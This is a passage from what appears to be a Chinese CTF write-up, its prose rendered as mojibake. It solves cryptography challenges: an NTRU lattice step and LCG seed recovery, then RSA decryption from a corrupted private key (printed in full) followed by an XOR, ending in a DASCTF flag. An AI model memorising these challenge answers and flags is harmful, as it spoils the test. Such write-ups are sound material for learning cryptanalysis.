2332673914418001018316159191702497430320194762477685969994411366563846498561222483921873160125818295447435796015251682805613716554577537183122368080760105458908517619529332931042168173262127728892648742025494771751133664547888267249802368767396121189473647263861691578834674578112521646941677994097088669110583465311980605508259404858000937372665500663077299603396786862387710064061811000146453852819607311367850587534711</span><br><span class="hljs-comment"># c = 20329058681057003355767546524327270876901063126285410163862577312957425318547938475645814390088863577141554443432653658287774537679738768993301095388221262144278253212238975358868925761055407920504398004143126310247822585095611305912801250788531962681592054588938446210412897150782558115114462054815460318533279921722893020563472010279486838372516063331845966834180751724227249589463408168677246991839581459878242111459287</span><br></code></pre></td></tr></table></figure><h2 id="Part1ï¼šNTRUæ±‚S3"><a href="#Part1ï¼šNTRUæ±‚S3" class="headerlink" title="Part1ï¼šNTRUæ±‚S3"></a>Part1ï¼šNTRUæ±‚S3</h2><p>å·²çŸ¥ï¼ˆ1ï¼‰$c\equiv sh + s_3 \mod p$<br>è¿˜æœ‰ï¼ˆ2ï¼‰$h \equiv f^{-1}*q \mod p$<br>ï¼ˆ1ï¼‰ä¸¤è¾¹åŒæ—¶ä¹˜ä»¥$f$ï¼Œæœ‰$cf\equiv sq + s_3f\mod p$<br>å†å¯¹$q$å–æ¨¡å¾—ï¼Œ$cf\equiv s_3f \mod q$ï¼Œä»¤$a&#x3D;cf$ï¼Œåˆ™æœ‰$a\equiv s_3f \mod q$<br>å› æ­¤æˆ‘ä»¬è¦æ±‚$(f,q)$<br>æ ¹æ®$hf\equiv q\mod p$æ„é€ æ ¼ï¼š</p><span>$$(f,k)\begin{pmatrix}1 & h\\0 & p\end{pmatrix}=(f,q)$$</span><p>æ±‚å¾—$s_3$</p><h2 id="Part2ï¼šLCGæ±‚seed"><a href="#Part2ï¼šLCGæ±‚seed" class="headerlink" title="Part2ï¼šLCGæ±‚seed"></a>Part2ï¼šLCGæ±‚seed</h2><p>åˆ©ç”¨å·²çŸ¥è¿ç»­5ä¸ªåºåˆ—å€¼å…ˆæ±‚æ¨¡$n$ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š<br>$m&#x3D;gcd(t_{n+1}t_{n-1} - t_n^2,t_{n+2}t_{n} - t_{n+1}^2 )$<br>å…·ä½“æ¨å¯¼å¯ä»¥çœ‹æˆ‘å¦ä¸€ç¯‡åšå®¢ï¼š<a href="https://ramoor.github.io/2025/04/08/Crypto%E5%9F%BA%E7%A1%80%E7%AF%87-LCG">CryptoåŸºç¡€ç¯‡-LCG Ramoor</a><br>å†æ±‚$a,b,seed$å³å¯<br><strong>è§£ç­”ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>S1 = <span class="hljs-number">28572152986082018877402362001567466234043851789360735202177142484311397443337910028526704343260845684960897697228636991096551426116049875141</span><br>S2 = <span class="hljs-number">1267231041216362976881495706209012999926322160351147349200659893781191687605978675590209327810284956626443266982499935032073788984220619657447889609681888</span><br>S4 = <span class="hljs-number">9739918644806242673966205531575183334306589742344399829232076845951304871478438938119813187502023845332528267974698273405630514228632721928260463654612997</span><br>S5 = <span class="hljs-number">9755668823764800147393276745829186812540710004256163127825800861195296361046987938775181398489372822667854079119037446327498475937494635853074634666112736</span><br>p = <span class="hljs-number">25886434964719448194352673440525701654705794467884891063997131230558866479588298264578120588832128279435501897537203249743883076992668855905005985050222145380285378634993563571078034923112985724204131887907198503097115380966366598622251191576354831935118147880783949022370177789175320661630501595157946150891275992785113199863734714343650596491139321990230671901990010723398037081693145723605154355325074739107535905777351</span><br>h = <span class="hljs-number">2332673914418001018316159191702497430320194762477685969994411366563846498561222483921873160125818295447435796015251682805613716554577537183122368080760105458908517619529332931042168173262127728892648742025494771751133664547888267249802368767396121189473647263861691578834674578112521646941677994097088669110583465311980605508259404858000937372665500663077299603396786862387710064061811000146453852819607311367850587534711</span><br>c = <span class="hljs-number">20329058681057003355767546524327270876901063126285410163862577312957425318547938475645814390088863577141554443432653658287774537679738768993301095388221262144278253212238975358868925761055407920504398004143126310247822585095611305912801250788531962681592054588938446210412897150782558115114462054815460318533279921722893020563472010279486838372516063331845966834180751724227249589463408168677246991839581459878242111459287</span><br><br><br>M = Matrix(ZZ,[[<span class="hljs-number">1</span>,h],[<span class="hljs-number">0</span>,p]])<br>L = M.LLL()[<span class="hljs-number">0</span>]<br>f , q = L<br>f = <span class="hljs-built_in">abs</span>(f)<br>q = <span class="hljs-built_in">abs</span>(q)<br><span class="hljs-built_in">print</span>(f,q)<br>a = (c*f) %p<br>S3 = a*inverse(f,q)%q<br><span class="hljs-comment">#print(S3.nbits())</span><br><br><span class="hljs-comment">#æ±‚æ¨¡n</span><br>X_seq=[S1,S2,S3,S4,S5]<br><br>t=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(X_seq)-<span class="hljs-number">1</span>):<br>t.append(X_seq[i+<span class="hljs-number">1</span>]-X_seq[i])<br><br>T=[]  <span class="hljs-comment">#T_i=T_ip2 * T_i - T_ip1**2 </span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(t)-<span class="hljs-number">2</span>):<br>T.append(t[i+<span class="hljs-number">2</span>]*t[i]-t[i+<span class="hljs-number">1</span>]**<span class="hljs-number">2</span>)<br><br>n=GCD(T[<span class="hljs-number">0</span>],T[<span class="hljs-number">1</span>]) <span class="hljs-comment">#nçš„å€™é€‰å€¼</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(T)):<br>    n=GCD(n,T[i])<br><span class="hljs-built_in">print</span>(n)<br><span class="hljs-comment">#æ±‚a,b,seed</span><br>a=inverse(S2-S1,n)*(S3-S2) %n<br>b=S2-a*S1 %n<br>m = inverse(a,n)*(S1-b) %n<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h1 id="XORè´¯ç©¿å§‹ç»ˆ"><a href="#XORè´¯ç©¿å§‹ç»ˆ" class="headerlink" title="XORè´¯ç©¿å§‹ç»ˆ"></a>XORè´¯ç©¿å§‹ç»ˆ</h1><p>massage.txt:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">è‡ªç”±å’Œè°å’Œè°å¯Œå¼ºå…¬æ­£å‹å–„çˆ±å›½å…¬æ­£æ³•æ²»æ³•æ²»æ–‡æ˜å’Œè°è‡ªç”±æ³•æ²»è‡ªç”±æ³•æ²»å¹³ç­‰å…¬æ­£å‹å–„å…¬æ­£å…¬æ­£æ°‘ä¸»æ³•æ²»è‡ªç”±å…¬æ­£æ•¬ä¸šå’Œè°å¯Œå¼ºå…¬æ­£å‹å–„çˆ±å›½å’Œè°å¹³ç­‰å¹³ç­‰å‹å–„æ•¬ä¸šæ³•æ²»æ•¬ä¸šå’Œè°å¯Œå¼ºæ³•æ²»å¹³ç­‰å¹³ç­‰å‹å–„æ•¬ä¸šå…¬æ­£å…¬æ­£å…¬æ­£å‹å–„æ•¬ä¸šæ³•æ²»å¹³ç­‰å¹³ç­‰è¯šä¿¡è‡ªç”±å…¬æ­£è‡ªç”±å¹³ç­‰å‹å–„æ•¬ä¸šå…¬æ­£å‹å–„æ³•æ²»å’Œè°å’Œè°<br></code></pre></td></tr></table></figure><p>ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚ç¼–ç è§£ç å¾—åˆ°</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">C0ngr4tulati0n5_y0u_fou^d_m3<br></code></pre></td></tr></table></figure><p>å°†å…¶ä½œä¸ºå‹ç¼©åŒ…å¯†ç è¿›è¡Œè§£å‹ç¼©<br>pri.pem</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">-----BEGIN PRIVATE KEY-----<br>MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALmtMy+2uH1ZtbIL<br>SuiAukFthyQRH5mp7UmLyzZQkdg9zEP9/5tgffikQ7ytx5kHySHnazgAO1sOzmYE<br>N4Axlev6uafiP8B1Eij97v5VkYJ1I9e3mtBNheTbXKoT8op+ASQ1fQaF4A8UzLuW<br>eZeZI8JTH/SH+bolAK3kiZXDFdkTAgMBAAECgYEAl067LaC7Cvs2A5cMPhfYsESv<br>IgcKN1CwW4Sd3u8dSphhgu7TgyzIuvwxbuo2g1BC6WwKhaI6vGN+csfw6nh98GEn<br>/p3D0huNroAYvf/DRRB9UnHdttX7wB+Mv3P0RBDWHgBiCDVvHFuFUV78cIs0tnbn<br>jxjU07aPV2XRC3AfA2ECQQDqWUNPVg3i6vTyHCL7EGkbeUheYpAAfcKCQrxjc5+5<br>X6A+XtgHAA1JHwykPlCpHUOmlA85DJF1ejuoImzlgRLJAkEAytTCnQF+MN2r1gaA<br>UETZyj5qMYT7Th8zKEVVVJjDawLnuX4usJ2FyRnjCkk86U75QSJhw5mMc0QnG25u<br>Gz3++w==<br>-----END PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>task.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> gcd<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> enflag<br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n = q * p<br>phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>e = getPrime(<span class="hljs-number">17</span>)<br><span class="hljs-keyword">assert</span> gcd(e, phi) == <span class="hljs-number">1</span><br><span class="hljs-comment"># ä»¥ä¸Šä¿¡æ¯ç”Ÿæˆäº†ç§é’¥æ–‡ä»¶,ä½†æ–‡ä»¶è¢«æŸåäº†ä½ èƒ½æå–æœ‰ç”¨ä¿¡æ¯å—</span><br><br>c = <span class="hljs-built_in">pow</span>(enflag, e, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c = &#x27;</span> + <span class="hljs-built_in">str</span>(c))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">c = 91817924748361493215143897386603397612753451291462468066632608541316135642691873237492166541761504834463859351830616117238028454453831120079998631107520871612398404926417683282285787231775479511469825932022611941912754602165499500350038397852503264709127650106856760043956604644700201911063515109074933378818</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>æç¤ºç§é’¥æ–‡ä»¶è¢«æŸåï¼Œå› æ­¤æˆ‘ä»¬é¦–å…ˆå¯¹ç§é’¥æ–‡ä»¶è¿›è¡Œbase64è§£ç å¹¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ•°æ®</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">30</span> <span class="hljs-number">82</span> <span class="hljs-number">02</span> <span class="hljs-number">77</span> <span class="hljs-number">02</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">30</span> <span class="hljs-number">0</span>d <span class="hljs-number">06</span> <span class="hljs-number">09</span> <span class="hljs-number">2</span>a <span class="hljs-number">86</span> <span class="hljs-number">48</span> <span class="hljs-number">86</span> f7 <span class="hljs-number">0</span>d <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">01</span> <span class="hljs-number">05</span> <span class="hljs-number">00</span> <span class="hljs-number">04</span> <span class="hljs-number">82</span> <span class="hljs-number">02</span> <span class="hljs-number">61</span> <span class="hljs-number">30</span> <span class="hljs-number">82</span> <span class="hljs-number">02</span> <span class="hljs-number">5</span>d <span class="hljs-number">02</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">02</span> <span class="hljs-number">81</span> <span class="hljs-number">81</span> <span class="hljs-number">00</span> b9 ad <span class="hljs-number">33</span> <span class="hljs-number">2</span>f b6 b8 <span class="hljs-number">7</span>d <span class="hljs-number">59</span> b5 b2 <span class="hljs-number">0</span>b <span class="hljs-number">4</span>a e8 <span class="hljs-number">80</span> ba <span class="hljs-number">41</span> <span class="hljs-number">6</span>d <span class="hljs-number">87</span> <span class="hljs-number">24</span> <span class="hljs-number">11</span> <span class="hljs-number">1</span>f <span class="hljs-number">99</span> a9 ed <span class="hljs-number">49</span> <span class="hljs-number">8</span>b cb <span class="hljs-number">36</span> <span class="hljs-number">50</span> <span class="hljs-number">91</span> d8 <span class="hljs-number">3</span>d cc <span class="hljs-number">43</span> fd ff <span class="hljs-number">9</span>b <span class="hljs-number">60</span> <span class="hljs-number">7</span>d f8 a4 <span class="hljs-number">43</span> bc ad c7 <span class="hljs-number">99</span> <span class="hljs-number">07</span> c9 <span class="hljs-number">21</span> e7 <span class="hljs-number">6</span>b <span class="hljs-number">38</span> <span class="hljs-number">00</span> <span class="hljs-number">3</span>b <span class="hljs-number">5</span>b <span class="hljs-number">0</span>e ce <span class="hljs-number">66</span> <span class="hljs-number">04</span> <span class="hljs-number">37</span> <span class="hljs-number">80</span> <span class="hljs-number">31</span> <span class="hljs-number">95</span> eb fa b9 a7 e2 <span class="hljs-number">3</span>f c0 <span class="hljs-number">75</span> <span class="hljs-number">12</span> <span class="hljs-number">28</span> fd ee fe <span class="hljs-number">55</span> <span class="hljs-number">91</span> <span class="hljs-number">82</span> <span class="hljs-number">75</span> <span class="hljs-number">23</span> d7 b7 <span class="hljs-number">9</span>a d0 <span class="hljs-number">4</span>d <span class="hljs-number">85</span> e4 db <span class="hljs-number">5</span>c aa <span class="hljs-number">13</span> f2 <span class="hljs-number">8</span>a <span class="hljs-number">7</span>e <span class="hljs-number">01</span> <span class="hljs-number">24</span> <span class="hljs-number">35</span> <span class="hljs-number">7</span>d <span class="hljs-number">06</span> <span class="hljs-number">85</span> e0 <span class="hljs-number">0</span>f <span class="hljs-number">14</span> cc bb <span class="hljs-number">96</span> <span class="hljs-number">79</span> <span class="hljs-number">97</span> <span class="hljs-number">99</span> <span class="hljs-number">23</span> c2 <span class="hljs-number">53</span> <span class="hljs-number">1</span>f f4 <span class="hljs-number">87</span> f9 ba <span class="hljs-number">25</span> <span class="hljs-number">00</span> ad e4 <span class="hljs-number">89</span> <span class="hljs-number">95</span> c3 <span class="hljs-number">15</span> d9 <span class="hljs-number">13</span> <span class="hljs-number">02</span> <span class="hljs-number">03</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">02</span> <span class="hljs-number">81</span> <span class="hljs-number">81</span> <span class="hljs-number">00</span> <span class="hljs-number">97</span> <span class="hljs-number">4</span>e bb <span class="hljs-number">2</span>d a0 bb <span class="hljs-number">0</span>a fb <span class="hljs-number">36</span> <span class="hljs-number">03</span> <span class="hljs-number">97</span> <span class="hljs-number">0</span>c <span class="hljs-number">3</span>e <span class="hljs-number">17</span> d8 b0 <span class="hljs-number">44</span> af <span class="hljs-number">22</span> <span class="hljs-number">07</span> <span class="hljs-number">0</span>a <span class="hljs-number">37</span> <span class="hljs-number">50</span> b0 <span class="hljs-number">5</span>b <span class="hljs-number">84</span> <span class="hljs-number">9</span>d de ef <span class="hljs-number">1</span>d <span class="hljs-number">4</span>a <span class="hljs-number">98</span> <span class="hljs-number">61</span> <span class="hljs-number">82</span> ee d3 <span class="hljs-number">83</span> <span class="hljs-number">2</span>c c8 ba fc <span class="hljs-number">31</span> <span class="hljs-number">6</span>e ea <span class="hljs-number">36</span> <span class="hljs-number">83</span> <span class="hljs-number">50</span> <span class="hljs-number">42</span> e9 <span class="hljs-number">6</span>c <span class="hljs-number">0</span>a <span class="hljs-number">85</span> a2 <span class="hljs-number">3</span>a bc <span class="hljs-number">63</span> <span class="hljs-number">7</span>e <span class="hljs-number">72</span> c7 f0 ea <span class="hljs-number">78</span> <span class="hljs-number">7</span>d f0 <span class="hljs-number">61</span> <span class="hljs-number">27</span> fe <span class="hljs-number">9</span>d c3 d2 <span class="hljs-number">1</span>b <span class="hljs-number">8</span>d ae <span class="hljs-number">80</span> <span class="hljs-number">18</span> bd ff c3 <span class="hljs-number">45</span> <span class="hljs-number">10</span> <span class="hljs-number">7</span>d <span class="hljs-number">52</span> <span class="hljs-number">71</span> dd b6 d5 fb c0 <span class="hljs-number">1</span>f <span class="hljs-number">8</span>c bf <span class="hljs-number">73</span> f4 <span class="hljs-number">44</span> <span class="hljs-number">10</span> d6 <span class="hljs-number">1</span>e <span class="hljs-number">00</span> <span class="hljs-number">62</span> <span class="hljs-number">08</span> <span class="hljs-number">35</span> <span class="hljs-number">6</span>f <span class="hljs-number">1</span>c <span class="hljs-number">5</span>b <span class="hljs-number">85</span> <span class="hljs-number">51</span> <span class="hljs-number">5</span>e fc <span class="hljs-number">70</span> <span class="hljs-number">8</span>b <span class="hljs-number">34</span> b6 <span class="hljs-number">76</span> e7 <span class="hljs-number">8</span>f <span class="hljs-number">18</span> d4 d3 b6 <span class="hljs-number">8</span>f <span class="hljs-number">57</span> <span class="hljs-number">65</span> d1 <span class="hljs-number">0</span>b <span class="hljs-number">70</span> <span class="hljs-number">1</span>f <span class="hljs-number">03</span> <span class="hljs-number">61</span> <span class="hljs-number">02</span> <span class="hljs-number">41</span> <span class="hljs-number">00</span> ea <span class="hljs-number">59</span> <span class="hljs-number">43</span> <span class="hljs-number">4</span>f <span class="hljs-number">56</span> <span class="hljs-number">0</span>d e2 ea f4 f2 <span class="hljs-number">1</span>c <span class="hljs-number">22</span> fb <span class="hljs-number">10</span> <span class="hljs-number">69</span> <span class="hljs-number">1</span>b <span class="hljs-number">79</span> <span class="hljs-number">48</span> <span class="hljs-number">5</span>e <span class="hljs-number">62</span> <span class="hljs-number">90</span> <span class="hljs-number">00</span> <span class="hljs-number">7</span>d c2 <span class="hljs-number">82</span> <span class="hljs-number">42</span> bc <span class="hljs-number">63</span> <span class="hljs-number">73</span> <span class="hljs-number">9</span>f b9 <span class="hljs-number">5</span>f a0 <span class="hljs-number">3</span>e <span class="hljs-number">5</span>e d8 <span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">0</span>d <span class="hljs-number">49</span> <span class="hljs-number">1</span>f <span class="hljs-number">0</span>c a4 <span class="hljs-number">3</span>e <span class="hljs-number">50</span> a9 <span class="hljs-number">1</span>d <span class="hljs-number">43</span> a6 <span class="hljs-number">94</span> <span class="hljs-number">0</span>f <span class="hljs-number">39</span> <span class="hljs-number">0</span>c <span class="hljs-number">91</span> <span class="hljs-number">75</span> <span class="hljs-number">7</span>a <span class="hljs-number">3</span>b a8 <span class="hljs-number">22</span> <span class="hljs-number">6</span>c e5 <span class="hljs-number">81</span> <span class="hljs-number">12</span> c9 <span class="hljs-number">02</span> <span class="hljs-number">41</span> <span class="hljs-number">00</span> ca d4 c2 <span class="hljs-number">9</span>d <span class="hljs-number">01</span> <span class="hljs-number">7</span>e <span class="hljs-number">30</span> dd ab d6 <span class="hljs-number">06</span> <span class="hljs-number">80</span> <span class="hljs-number">50</span> <span class="hljs-number">44</span> d9 ca <span class="hljs-number">3</span>e <span class="hljs-number">6</span>a <span class="hljs-number">31</span> <span class="hljs-number">84</span> fb <span class="hljs-number">4</span>e <span class="hljs-number">1</span>f <span class="hljs-number">33</span> <span class="hljs-number">28</span> <span class="hljs-number">45</span> <span class="hljs-number">55</span> <span class="hljs-number">54</span> <span class="hljs-number">98</span> c3 <span class="hljs-number">6</span>b <span class="hljs-number">02</span> e7 b9 <span class="hljs-number">7</span>e <span class="hljs-number">2</span>e b0 <span class="hljs-number">9</span>d <span class="hljs-number">85</span> c9 <span class="hljs-number">19</span> e3 <span class="hljs-number">0</span>a <span class="hljs-number">49</span> <span class="hljs-number">3</span>c e9 <span class="hljs-number">4</span>e f9 <span class="hljs-number">41</span> <span class="hljs-number">22</span> <span class="hljs-number">61</span> c3 <span class="hljs-number">99</span> <span class="hljs-number">8</span>c <span class="hljs-number">73</span> <span class="hljs-number">44</span> <span class="hljs-number">27</span> <span class="hljs-number">1</span>b <span class="hljs-number">6</span>e <span class="hljs-number">6</span>e <span class="hljs-number">1</span>b <span class="hljs-number">3</span>d fe fb<br></code></pre></td></tr></table></figure><p>æŒ‰ç…§é¡ºåºå„ä¸ªéƒ¨åˆ†å¾—ç‰¹ç‚¹è¿›è¡Œæ‹†åˆ†ï¼š</p><ul><li><code>02 81 81</code>è¡¨ç¤º0x81å³129å­—èŠ‚çš„æ¨¡æ•°nï¼š<code>00 b9 ad 33 2f b6 b8 7d 59 b5 b2 0b 4a e8 80 ba 41 6d 87 24 11 1f 99 a9 ed 49 8b cb 36 50 91 d8 3d cc 43 fd ff 9b 60 7d f8 a4 43 bc ad c7 99 07 c9 21 e7 6b 38 00 3b 5b 0e ce 66 04 37 80 31 95 eb fa b9 a7 e2 3f c0 75 12 28 fd ee fe 55 91 82 75 23 d7 b7 9a d0 4d 85 e4 db 5c aa 13 f2 8a 7e 01 24 35 7d 06 85 e0 0f 14 cc bb 96 79 97 99 23 c2 53 1f f4 87 f9 ba 25 00 ad e4 89 95 c3 15 d9 13</code></li><li><code>02 03</code>è¡¨ç¤ºeï¼š<code>01 00 01</code>å³e&#x3D;65537</li><li><code>02 81 81</code>è¡¨ç¤º0x81å³129å­—èŠ‚çš„ç§é’¥æŒ‡æ•°dï¼š<code>00 97 4e bb 2d a0 bb 0a fb 36 03 97 0c 3e 17 d8 b0 44 af 22 07 0a 37 50 b0 5b 84 9d de ef 1d 4a 98 61 82 ee d3 83 2c c8 ba fc 31 6e ea 36 83 50 42 e9 6c 0a 85 a2 3a bc 63 7e 72 c7 f0 ea 78 7d f0 61 27 fe 9d c3 d2 1b 8d ae 80 18 bd ff c3 45 10 7d 52 71 dd b6 d5 fb c0 1f 8c bf 73 f4 44 10 d6 1e 00 62 08 35 6f 1c 5b 85 51 5e fc 70 8b 34 b6 76 e7 8f 18 d4 d3 b6 8f 57 65 d1 0b 70 1f 03 61</code><br>ä½¿ç”¨è„šæœ¬è·å–mï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">d = <span class="hljs-number">0x00974ebb2da0bb0afb3603970c3e17d8b044af22070a3750b05b849ddeef1d4a986182eed3832cc8bafc316eea36835042e96c0a85a23abc637e72c7f0ea787df06127fe9dc3d21b8dae8018bdffc345107d5271ddb6d5fbc01f8cbf73f44410d61e006208356f1c5b85515efc708b34b676e78f18d4d3b68f5765d10b701f0361</span><br>e = <span class="hljs-number">0x10001</span><br>n = <span class="hljs-number">0x00b9ad332fb6b87d59b5b20b4ae880ba416d8724111f99a9ed498bcb365091d83dcc43fdff9b607df8a443bcadc79907c921e76b38003b5b0ece660437803195ebfab9a7e23fc0751228fdeefe5591827523d7b79ad04d85e4db5caa13f28a7e0124357d0685e00f14ccbb9679979923c2531ff487f9ba2500ade48995c315d913</span><br>c = <span class="hljs-number">91817924748361493215143897386603397612753451291462468066632608541316135642691873237492166541761504834463859351830616117238028454453831120079998631107520871612398404926417683282285787231775479511469825932022611941912754602165499500350038397852503264709127650106856760043956604644700201911063515109074933378818</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><p>è·å–æ˜æ–‡mï¼š</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">DASCTF&#123;<span class="hljs-number">0e287</span>wQ\<span class="hljs-keyword">x</span><span class="hljs-number">08</span>R\<span class="hljs-keyword">x</span><span class="hljs-number">17</span>\<span class="hljs-keyword">x</span><span class="hljs-number">00</span>FGXYFZ\<span class="hljs-keyword">x</span><span class="hljs-number">07</span>V\<span class="hljs-keyword">x</span><span class="hljs-number">03</span>kIUCn\<span class="hljs-keyword">x</span><span class="hljs-number">02</span>VDg\<span class="hljs-keyword">x</span><span class="hljs-number">01</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">0</span>cN<br></code></pre></td></tr></table></figure><p>å‘ç°ååŠæ®µæ²¡æ­£å¸¸æ˜¾ç¤ºï¼Œæ ¹æ®é¢˜ç›®çŒœæµ‹éœ€è¦å°†ç¬¬ä¸€æ­¥å¾—åˆ°çš„å­—ç¬¦ä¸²å’Œè¯¥ä¸²è¿›è¡Œå¼‚æˆ–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">b = <span class="hljs-string">b&#x27;C0ngr4tulati0n5_y0u_fou^d_m3&#x27;</span><br>ans = bytes_to_long(b)  ^ m<br><span class="hljs-built_in">print</span>(long_to_bytes(ans))<br></code></pre></td></tr></table></figure><p>å¾—åˆ°ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">DASCTF</span>&#123;<span class="hljs-number">0</span>e2874af5e422482378640e61d919e9a&#125;<br></code></pre></td></tr></table></figure><h1 id="SigninCrypto"><a href="#SigninCrypto" class="headerlink" title="SigninCrypto"></a>SigninCrypto</h1><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> DES3<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">from</span> key <span class="hljs-keyword">import</span> key<br><span class="hljs-keyword">from</span> iv <span class="hljs-keyword">import</span> iv<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> secrets<br><br>K1= key<br>hint1 = os.urandom(<span 